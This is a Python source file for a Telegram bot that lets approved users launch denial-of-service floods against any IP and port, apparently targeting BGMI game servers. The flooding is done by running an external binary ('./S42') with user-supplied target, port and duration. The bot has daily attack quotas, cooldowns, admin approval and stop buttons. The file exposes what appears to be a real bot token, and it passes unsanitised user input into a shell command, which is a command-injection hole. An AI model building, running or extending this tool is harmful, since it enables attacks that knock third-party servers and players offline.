import telebot
import subprocess
import threading
import time
from datetime import datetime, timedelta
from telebot.types import InlineKeyboardButton, InlineKeyboardMarkup

# Bot token and admin ID
bot_token = '7694602747:AAGLCVsIVhrnA4_Myjq9t0MyYVN8lFjKH3A'
admin_id = '6769245930'  # Replace with your actual admin user ID
GROUP_ID = '-1002220511003'  # Allowed group ID

# List of approved users for private chat access
approved_private_users = set()

# Max daily attacks per person
max_daily_attacks = 10
user_attack_count = {}
running_attacks = {}
user_last_attack_time = {}
COOLDOWN_TIME = 240 # 180 seconds cooldown

# Create bot instance
bot = telebot.TeleBot(bot_token)

# Function to reset attack count at midnight
def reset_attack_count():
    while True:
        now = datetime.now()
        next_reset = now.replace(hour=0, minute=0, second=0, microsecond=0) + timedelta(days=1)
        time_to_wait = (next_reset - now).total_seconds()
        time.sleep(time_to_wait)
        user_attack_count.clear()  # Reset attack count every midnight

# Start reset attack count thread
reset_thread = threading.Thread(target=reset_attack_count, daemon=True)
reset_thread.start()

# Check daily attack limit
def get_remaining_attacks(user_id):
    return max_daily_attacks - user_attack_count.get(user_id, 0)

# Check if the bot should run in the given chat
def is_allowed_chat(chat_id):
    return str(chat_id) == GROUP_ID or str(chat_id) in approved_private_users or str(chat_id) == admin_id

# Command: Start with request access button
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = str(message.chat.id)
    
    if user_id == admin_id or user_id in approved_private_users:
        bot.reply_to(message, "✅ 𝗬𝗼𝘂 𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 𝗕𝘆 𝗦𝟰 𝗟𝘂𝗰𝗵𝗶 \n🎉𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗣𝗥𝗜𝗩𝗔𝗧𝗘 𝗖𝗛𝗔𝗧 \n\n𝗧𝗵𝗮𝗻𝗸𝘀 𝗳𝗼𝗿 𝗝𝗼𝗶𝗻𝗶𝗻𝗴 ❤️")
    else:
        markup = InlineKeyboardMarkup()
        request_button = InlineKeyboardButton("Request Access ☹️", callback_data=f"request_{user_id}")
        markup.add(request_button)
        bot.send_message(user_id, "⚠️ 𝚈𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚙𝚙𝚛𝚘𝚟𝚎𝚍 𝚝𝚘 𝚞𝚜𝚎 𝚝𝚑𝚎 𝚋𝚘𝚝. \n𝙲𝚕𝚒𝚌𝚔 𝚋𝚎𝚕𝚘𝚠 𝚝𝚘 𝚛𝚎𝚚𝚞𝚎𝚜𝚝 𝚊𝚌𝚌𝚎𝚜𝚜.", reply_markup=markup)

# Handle request button
@bot.callback_query_handler(func=lambda call: call.data.startswith('request_'))
def request_access(call):
    user_id = call.data.split('_')[1]
    user = bot.get_chat(user_id)
    username = user.username if user.username else "No username"
    bot.send_message(admin_id, f"✅ 𝗡𝗘𝗪 𝗥𝗘𝗤𝗨𝗘𝗦𝗧\n\n🆔 - `{user_id}` 𝕠𝐫👤 @({username}) \n𝗥𝗲𝗾𝘂𝗲𝘀𝘁𝗲𝗱 𝗳𝗼𝗿 𝗽𝗿𝗶𝘃𝗮𝘁𝗲\n✓ `/approve_in_private {user_id}` to approve.")
    bot.send_message(user_id, "𝗥𝗘𝗤𝗨𝗘𝗦𝗧 𝗦𝗘𝗡𝗗 𝗦𝗨𝗖𝗖𝗘𝗦𝗦𝗙𝗨𝗟𝗟𝗬✅\n𝗣𝗟𝗘𝗔𝗦𝗘 𝗪𝗔𝗜𝗧 𝗙𝗢𝗥 𝗔𝗣𝗣𝗥𝗢𝗩𝗔𝗟")

# Command: Approve user for private chat
@bot.message_handler(commands=['approve_in_private'])
def approve_in_private(message):
    if str(message.chat.id) != admin_id:
        return
    command = message.text.split()
    if len(command) == 2:
        target_user_id = command[1]
        approved_private_users.add(target_user_id)
        bot.send_message(target_user_id, "𝗪𝗘𝗟𝗖𝗢𝗠𝗘 🎉🎉🎉\n\n𝘠𝘖𝘜𝘙 𝘈𝘙𝘌 𝘈𝘗𝘗𝘙𝘖𝘝𝘌𝘋 ☺️\n𝗡𝗢𝗪 𝗨𝗦𝗘.\n/bgmi <ᴛᴀʀɢᴇᴛ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")
        bot.reply_to(message, f"🄰🄿🄿🅁🄾🅅🄴 👍\n\n🆔 - {target_user_id}\n\n𝗙𝗜𝗟𝗟 𝗟𝗜𝗞𝗘 𝗘𝗫𝗣𝗟𝗢𝗥𝗘𝗥")
    else:
        bot.reply_to(message, "ᴜꜱᴀɢᴇ: /ᴀᴘᴘʀᴏᴠᴇ_ɪɴ_ᴘʀɪᴠᴀᴛᴇ <ᴜꜱᴇʀ_ɪᴅ>")

# Command: Remove user from private chat access
@bot.message_handler(commands=['remove_in_private_chat'])
def remove_in_private_chat(message):
    if str(message.chat.id) != admin_id:
        return
    command = message.text.split()
    if len(command) == 2:
        target_user_id = command[1]
        if target_user_id in approved_private_users:
            approved_private_users.remove(target_user_id)
            bot.send_message(target_user_id, "𝗬𝗢𝗨 𝗔𝗥𝗘 𝗥𝗘𝗠𝗢𝗩𝗘𝗗 😞")
            bot.reply_to(message, f"𝖀𝖘𝖊𝖗 {target_user_id} ℝ𝕖𝕞𝕠𝕧𝕖𝕕")
        else:
            bot.reply_to(message, f"{target_user_id} ɪꜱ ɴᴏᴛ ᴀᴘᴘʀᴏᴠᴇᴅ ꜰᴏʀ ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ ᴀᴄᴄᴇꜱꜱ")
    else:
        bot.reply_to(message, "ᴜꜱᴀɢᴇ: /ʀᴇᴍᴏᴠᴇ_ɪɴ_ᴘʀɪᴠᴀᴛᴇ_ᴄʜᴀᴛ <ᴜꜱᴇʀ_ɪᴅ>")

# Command: Check remaining attacks
@bot.message_handler(commands=['check'])
def check_limit(message):
    if not is_allowed_chat(message.chat.id):
        return
    remaining_attacks = get_remaining_attacks(str(message.chat.id))
    bot.reply_to(message, f"🅈🄾🅄 🄷🄰🅅🄴\n𝗧𝗢𝗧𝗔𝗟 - {remaining_attacks} 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐋𝐞𝐟𝐭 𝐓𝐨𝐝𝐚𝐲")

# Command: Show user ID
@bot.message_handler(commands=['id'])
def show_user_id(message):
    if not is_allowed_chat(message.chat.id):
        return
    bot.reply_to(message, f"🆔 - {message.chat.id}")

# Command: Attack execution (for legitimate use)
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if not is_allowed_chat(user_id):
        return

    remaining_attacks = get_remaining_attacks(user_id)
    if remaining_attacks <= 0:
        bot.reply_to(message, f"‼️ 𝗡𝗢𝗧𝗜𝗖𝗘 ‼️\n\nʏᴏᴜ ʜᴀᴠᴇ ʀᴇᴀᴄʜᴇᴅ ʏᴏᴜʀ \nᴅᴀɪʟʏ ʟɪᴍɪᴛ ᴏꜰ {max_daily_attacks} 𝗔𝘁𝘁𝗮𝗰𝗸𝘀\n\n𝗣𝗹𝗲𝗮𝘀𝗲 𝗖𝗼𝗺𝗲 𝗧𝗼𝗺𝗼𝗿𝗿𝗼𝘄 🙏")
        return

    current_time = time.time()
    last_attack_time = user_last_attack_time.get(user_id, 0)
    cooldown_remaining = COOLDOWN_TIME - (current_time - last_attack_time)

    if cooldown_remaining > 0:
        bot.reply_to(message, f"⚫ 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡 𝗦𝗧𝗔𝗥𝗧𝗘𝗗 ⚫\n\n🅁🄴🄼🄰🄸🄽🄸🄽🄶 - {int(cooldown_remaining)}𝗦𝗲𝗰𝗼𝗻𝗱𝘀\n𝙿𝚛𝚘𝚟𝚒𝚍𝚎 𝙵𝚎𝚎𝚍𝚋𝚊𝚌𝚔 𝙽𝚘𝚠.\n\n𝗙𝗲𝗲𝗱𝗯𝗮𝗰𝗸 𝗗𝗠 - @S4_LUCHI\n\nⓈ④ ⓄⒻⒻⒾⒸⒾⒶⓁ ⒼⓇⓅ")
        return

    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧 ⚠️\n\nᴘʟᴇᴀꜱᴇ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ᴀᴛᴛᴀᴄᴋ\nᴇx. /ʙɢᴍɪ <ɪᴘ> <ᴘᴏʀᴛ> <ᴛɪᴍᴇ>\nΣX. /bgmi 12.3.45.6.0 12345 180\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")
        return

    target, port, attack_time = command[1], command[2], command[3]

    if int(attack_time) > 240:
        bot.reply_to(message, "𝗗𝗨𝗥𝗔𝗧𝗜𝗢𝗡 𝗘𝗥𝗥𝗢𝗥 - 𝗧𝗥𝗬 𝟮𝟰𝟬")
        return

    user_last_attack_time[user_id] = current_time
    user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1

    full_command = f"./S42 {target} {port} {attack_time} 1000"
    process = subprocess.Popen(full_command, shell=True)
    running_attacks[user_id] = process

    threading.Thread(target=monitor_attack, args=(user_id, process, attack_time, target, port)).start()


    markup = InlineKeyboardMarkup()
    stop_button = InlineKeyboardButton("Stop Attack", callback_data=f"stop_{user_id}")
    markup.add(stop_button)
    bot.send_message(admin_id, f"𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧 💥\n\n𝗙𝗥𝗢𝗠 - 🆔 - {user_id}\n\n🌐 🄸🄿 {target} \n💠 🄿🄾🅁🅃 {port} \n🔷 🅃🄸🄼🄴 {attack_time}s\n𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐨𝐟 - {get_remaining_attacks(user_id)}\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩", reply_markup=markup)

    bot.reply_to(message, f"𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧 💥\n\n𝗙𝗥𝗢𝗠 - 🆔 - {user_id}\n\n🌐 🄸🄿 {target} \n💠 🄿🄾🅁🅃 {port} \n🔷 🅃🄸🄼🄴 {attack_time}s\n𝐑𝐞𝐦𝐚𝐢𝐧𝐢𝐧𝐠 𝐨𝐟 - {get_remaining_attacks(user_id)}\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")

def monitor_attack(user_id, process, attack_time, target, port):
    # Wait for the specified attack time (in seconds)
    time.sleep(int(attack_time))  # Attack duration

    # After the specified attack time, terminate the process if still running
    if process.poll() is None:
        process.terminate()

    # Add a small delay before sending the message to ensure the process is properly terminated
    time.sleep(1)

    # Prepare the completion message
    completion_message = (
        f"**𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘**\n\n"
        f"**𝗙𝗥𝗢𝗠🆔** `{user_id}`\n"
        f"**🌐 🄸🄿** `{target}`\n"
        f"**💠 🄿🄾🅁🅃:** `{port}`\n"
        f"**🔷 🅃🄸🄼🄴:** `{attack_time}s`\n\n"
        "‼️𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣‼️"
    )

    # Notify the user of the attack completion
    bot.send_message(user_id, completion_message)

    # Notify the admin of the attack completion
    bot.send_message(admin_id, f"**𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘**\n\n"
                               f"**𝗙𝗥𝗢𝗠🆔** `{user_id}`\n"
                               f"**🌐 🄸🄿** `{target}`\n"
                               f"**💠 🄿🄾🅁🅃:** `{port}`\n"
                               f"**🔷 🅃🄸🄼🄴:** `{attack_time}s`\n\n"
                               "‼️𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣‼️")

    # Remove from running attacks list
    running_attacks.pop(user_id, None)


# Stop attack via inline button (for legitimate use)
@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_attack(call):
    user_id = call.data.split('_')[1]
    if user_id in running_attacks:
        running_attacks[user_id].terminate()
        bot.send_message(user_id, "📢 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗢𝗣 𝗕𝗬 𝗔𝗗𝗠𝗜𝗡 𝗦𝟰")
        bot.send_message(admin_id, f"💀 𝗦𝗧𝗢𝗣𝗣𝗘𝗗 𝗔𝗧𝗧𝗔𝗖𝗞 💀\n🆔 - {user_id}\n\n𝗦𝟰 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗚𝗥𝗣 🚩")
        del running_attacks[user_id]
    else:
        bot.send_message(call.message.chat.id, "𝗡𝗢𝗧 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 𝗔𝗡𝗬 𝗔𝗧𝗧𝗔𝗖𝗞 😭")

@bot.message_handler(commands=['reset'])
def handle_reset(message):
    user_id = str(message.chat.id)

    # Check if the user is an admin
    if user_id in admin_id:
        # Extract the target user ID from the command
        command = message.text.split()
        if len(command) == 2:
            target_user_id = command[1]
            
            # Reset the attack count for the specified user
            if target_user_id in user_attack_count:
                user_attack_count[target_user_id] = 0
                response = f"𝙐𝙎𝙀𝙍 {target_user_id} 𝘾𝙍𝙀𝘿𝙄𝙏𝙎 𝙍𝙀𝙎𝙀𝙏 𝙎𝙐𝘾𝘾𝙀𝙎𝙎𝙁𝙐𝙇𝙇𝙔"
            else:
                response = f"𝐋𝐈𝐅𝐄 𝐋𝐈𝐍𝐄 𝐀𝐋𝐈𝐕𝐄 😎 {target_user_id}."
        else:
            response = "𝚃𝚛𝚢 𝙰𝚐𝚊𝚒𝚗 - /𝚛𝚎𝚜𝚎𝚝 <𝚞𝚜𝚎𝚛_𝚒𝚍>"
    else:
        response = "𝐘𝐨𝐮 𝐃𝐨 𝐍𝐨𝐭 𝐇𝐚𝐯𝐞 𝐏𝐞𝐫𝐦𝐢𝐬𝐬𝐢𝐨𝐧🚫 𝐓𝐨 𝐑𝐞𝐬𝐞𝐭 𝐓𝐡𝐞 𝐚𝐭𝐭𝐚𝐜𝐤 𝐂𝐫𝐞𝐝𝐢𝐭𝐬"

    bot.reply_to(message, response)
    
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = (
        "𝔸𝕧𝕒𝕚𝕝𝕒𝕓𝕝𝕖 ℂ𝕠𝕞𝕞𝕒𝕟𝕕𝕤 👇👇👇\n\n"
        "❤️‍🔥 /bgmi 🙅 /reset\n"
        "🆔 /id  🩷 /check\n"
        "🥶 /help \n\n"
        "    ❤️Owner - @S4_LUCHI  \n\n"
        "𝙵𝚞𝚕𝚕𝚢 𝚄𝚙𝚐𝚛𝚊𝚍𝚎𝚍 𝙱𝚘𝚝 𝙱𝚢 𝚂𝟺\n\n"
        "☠ 𝕤❹ ⓞғ𝔽ιᑕ𝐈𝓪Ｌ 𝔤ｒᵖ ☠"
    )
    bot.reply_to(message, help_text)
    
# Start bot polling
bot.polling(none_stop=True)
